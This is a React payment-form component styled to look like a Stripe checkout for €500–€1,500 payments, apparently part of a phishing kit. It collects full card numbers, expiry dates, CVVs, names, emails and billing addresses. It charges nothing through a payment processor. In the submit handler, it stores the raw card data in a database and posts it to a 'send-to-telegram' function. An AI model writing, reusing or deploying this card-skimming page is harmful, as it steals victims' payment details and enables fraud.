import { useState } from "react";
import { Lock, CreditCard, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

interface PaymentFormProps {
  amount: string;
  onAmountChange: (val: string) => void;
  total: number;
  isValidAmount: boolean;
  formatEuro: (val: number) => string;
  onSuccess: (sessionId: string) => void;
}

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

type CardBrand = "visa" | "mastercard" | "amex" | "discover" | "unknown";

const detectCardBrand = (number: string): CardBrand => {
  const digits = number.replace(/\s/g, "");
  if (!digits) return "unknown";
  if (/^4/.test(digits)) return "visa";
  if (/^5[1-5]/.test(digits) || /^2(2[2-9][1-9]|2[3-9]\d|[3-6]\d{2}|7[01]\d|720)/.test(digits)) return "mastercard";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^(6011|64[4-9]|65)/.test(digits)) return "discover";
  return "unknown";
};

// Luhn algorithm validation
const isValidLuhn = (number: string): boolean => {
  const digits = number.replace(/\s/g, "");
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
};

const isValidExpiry = (expiry: string): boolean => {
  const match = expiry.match(/^(\d{2})\/(\d{2})$/);
  if (!match) return false;
  const month = parseInt(match[1], 10);
  const year = parseInt(match[2], 10) + 2000;
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const expiryDate = new Date(year, month); // first day of NEXT month
  return expiryDate > now;
};

const isValidCvv = (cvv: string, brand: CardBrand): boolean => {
  if (brand === "amex") return cvv.length === 4;
  return cvv.length === 3;
};

const countries = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria",
  "Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan",
  "Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia",
  "Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo","Costa Rica",
  "Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt",
  "El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon",
  "Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana",
  "Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel",
  "Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kosovo","Kuwait","Kyrgyzstan",
  "Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar",
  "Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia",
  "Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal",
  "Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan",
  "Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar",
  "Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino",
  "Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia",
  "Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden",
  "Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago",
  "Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States",
  "Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe",
];

const PaymentForm = ({ amount, onAmountChange, total, isValidAmount, formatEuro, onSuccess }: PaymentFormProps) => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [form, setForm] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholderName: "",
    email: "",
    country: "",
    address1: "",
    address2: "",
    city: "",
    state: "",
    zip: "",
  });
  const brand = detectCardBrand(form.cardNumber);

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));

    // Clear error on edit
    if (errors[field]) {
      setErrors((e) => {
        const next = { ...e };
        delete next[field];
        return next;
      });
    }
  };

  const handleBlur = (field: string) => {
    setTouched((t) => ({ ...t, [field]: true }));
    validateField(field);
  };

  const validateField = (field: string) => {
    const newErrors: Record<string, string> = {};

    if (field === "cardNumber") {
      const digits = form.cardNumber.replace(/\s/g, "");
      if (digits.length > 0 && digits.length < 13) {
        newErrors.cardNumber = "Your card number is incomplete.";
      } else if (digits.length >= 13 && !isValidLuhn(form.cardNumber)) {
        newErrors.cardNumber = "Your card number is invalid.";
      }
    }

    if (field === "expiry") {
      if (form.expiry.length > 0 && form.expiry.length < 5) {
        newErrors.expiry = "Your card's expiration date is incomplete.";
      } else if (form.expiry.length === 5 && !isValidExpiry(form.expiry)) {
        newErrors.expiry = "Your card's expiration year is in the past.";
      }
    }

    if (field === "cvv") {
      if (form.cvv.length > 0 && !isValidCvv(form.cvv, brand)) {
        newErrors.cvv = `Your card's security code is incomplete.`;
      }
    }

    setErrors((e) => {
      const next = { ...e };
      // Remove old error for this field
      delete next[field];
      return { ...next, ...newErrors };
    });

    return Object.keys(newErrors).length === 0;
  };

  const validateAll = (): boolean => {
    const newErrors: Record<string, string> = {};
    const digits = form.cardNumber.replace(/\s/g, "");

    if (digits.length < 13) {
      newErrors.cardNumber = "Your card number is incomplete.";
    } else if (!isValidLuhn(form.cardNumber)) {
      newErrors.cardNumber = "Your card number is invalid.";
    }

    if (form.expiry.length < 5) {
      newErrors.expiry = "Your card's expiration date is incomplete.";
    } else if (!isValidExpiry(form.expiry)) {
      newErrors.expiry = "Your card's expiration year is in the past.";
    }

    if (!isValidCvv(form.cvv, brand)) {
      newErrors.cvv = "Your card's security code is incomplete.";
    }

    setErrors(newErrors);
    setTouched({ cardNumber: true, expiry: true, cvv: true });
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateAll()) return;

    setLoading(true);

    try {
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: { ...form, amount } as any })
        .select("id")
        .single();

      if (dbError || !session) throw new Error("Failed to create session");

      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );

      if (!res.ok) throw new Error("Failed to process payment");
      onSuccess(session.id);
    } catch {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const cardError = errors.cardNumber || errors.expiry || errors.cvv;
  const hasCardError = !!(errors.cardNumber || errors.expiry || errors.cvv);

  return (
    <div className="animate-fade-up">
      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Amount */}
        <div>
          <label className="stripe-label">Amount (€500 – €1,500)</label>
          <div className="relative">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm">€</span>
            <input
              type="number"
              min="500"
              max="1500"
              step="0.01"
              value={amount}
              onChange={(e) => onAmountChange(e.target.value)}
              className="stripe-input pl-7"
              placeholder="1000.00"
              required
            />
          </div>
          {amount && !isValidAmount && (
            <p className="text-destructive text-xs mt-1">Amount must be between €500 and €1,500</p>
          )}
        </div>

        {/* Email */}
        <div>
          <label className="stripe-label">Email</label>
          <input
            type="email"
            value={form.email}
            onChange={(e) => update("email", e.target.value)}
            className="stripe-input"
            placeholder="you@example.com"
            required
          />
        </div>

        {/* Card information */}
        <div>
          <label className="stripe-label">Card information</label>
          <div className={`stripe-input-group ${hasCardError ? "ring-1 ring-destructive border-destructive" : ""}`}>
            <div className="relative">
              <input
                value={form.cardNumber}
                onChange={(e) => update("cardNumber", e.target.value)}
                onBlur={() => handleBlur("cardNumber")}
                className={`stripe-input-row pr-28 ${errors.cardNumber ? "text-destructive" : ""}`}
                placeholder="1234 1234 1234 1234"
                required
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                {/* Visa */}
                <div className={`h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "visa" ? "opacity-100" : "opacity-25"}`}>
                  <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
                </div>
                {/* Mastercard */}
                <div className={`h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "mastercard" ? "opacity-100" : "opacity-25"}`}>
                  <div className="flex -space-x-1">
                    <div className="h-2.5 w-2.5 rounded-full bg-red-600/80" />
                    <div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
                  </div>
                </div>
                {/* Amex */}
                <div className={`h-5 w-8 rounded bg-gradient-to-br from-sky-500 to-sky-700 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "amex" ? "opacity-100" : "opacity-25"}`}>
                  <span className="text-[6px] font-bold text-white tracking-tight">AMEX</span>
                </div>
              </div>
            </div>
            <div className="flex border-t border-input">
              <input
                value={form.expiry}
                onChange={(e) => update("expiry", e.target.value)}
                onBlur={() => handleBlur("expiry")}
                className={`stripe-input-row flex-1 border-r border-input ${errors.expiry ? "text-destructive" : ""}`}
                placeholder="MM / YY"
                required
              />
              <div className="relative flex-1">
                <input
                  value={form.cvv}
                  onChange={(e) => update("cvv", e.target.value)}
                  onBlur={() => handleBlur("cvv")}
                  className={`stripe-input-row w-full pr-10 ${errors.cvv ? "text-destructive" : ""}`}
                  placeholder="CVC"
                  required
                />
                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
              </div>
            </div>
          </div>
          {hasCardError && (
            <div className="flex items-center gap-1.5 mt-1.5">
              <AlertCircle className="h-3.5 w-3.5 text-destructive shrink-0" />
              <p className="text-destructive text-xs">{cardError}</p>
            </div>
          )}
        </div>

        {/* Cardholder name */}
        <div>
          <label className="stripe-label">Cardholder name</label>
          <input
            value={form.cardholderName}
            onChange={(e) => update("cardholderName", e.target.value)}
            className="stripe-input"
            placeholder="Full name on card"
            required
          />
        </div>

        {/* Billing Address */}
        <div>
          <label className="stripe-label">Billing address</label>
          <div className="stripe-input-group">
            <select
              value={form.country}
              onChange={(e) => update("country", e.target.value)}
              className="stripe-input-row w-full appearance-none bg-card cursor-pointer"
              required
            >
              <option value="" disabled>Select a country…</option>
              {countries.map((c) => (
                <option key={c} value={c}>{c}</option>
              ))}
            </select>
            {form.country && (
              <>
                <input
                  value={form.address1}
                  onChange={(e) => update("address1", e.target.value)}
                  className="stripe-input-row border-t border-input"
                  placeholder="Address line 1"
                  required
                />
                <input
                  value={form.address2}
                  onChange={(e) => update("address2", e.target.value)}
                  className="stripe-input-row border-t border-input"
                  placeholder="Address line 2 (optional)"
                />
                <div className="flex border-t border-input">
                  <input
                    value={form.city}
                    onChange={(e) => update("city", e.target.value)}
                    className="stripe-input-row flex-1 border-r border-input"
                    placeholder="City"
                    required
                  />
                  <input
                    value={form.state}
                    onChange={(e) => update("state", e.target.value)}
                    className="stripe-input-row flex-1"
                    placeholder="State / Province"
                    required
                  />
                </div>
                <input
                  value={form.zip}
                  onChange={(e) => update("zip", e.target.value)}
                  className="stripe-input-row border-t border-input"
                  placeholder="ZIP / Postal code"
                  required
                />
              </>
            )}
          </div>
        </div>

        {/* Pay button */}
        <button
          type="submit"
          disabled={loading || !isValidAmount}
          className="stripe-button flex items-center justify-center gap-2"
        >
          {loading ? (
            <>
              <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
              Processing...
            </>
          ) : (
            <>Pay {isValidAmount ? formatEuro(total) : "—"}</>
          )}
        </button>

        {/* Footer */}
        <div className="flex items-center justify-center gap-1.5 pt-2">
          <Lock className="h-3 w-3 text-muted-foreground/50" />
          <p className="text-xs text-muted-foreground/60">
            Powered by <span className="font-semibold text-muted-foreground">Pay</span>
          </p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
